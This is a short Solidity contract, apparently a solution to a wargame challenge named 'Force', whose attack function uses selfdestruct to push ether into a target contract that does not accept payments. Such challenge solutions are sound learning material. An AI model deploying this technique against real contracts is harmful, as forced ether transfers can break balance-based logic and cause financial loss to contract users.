// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Force {
}

contract kamikadze {
    Force public victimContract;
    constructor(address _victimContract) payable {
        victimContract = Force(_victimContract);
    }
    function attack() public payable {
        selfdestruct(payable(address(victimContract)));
    }
}
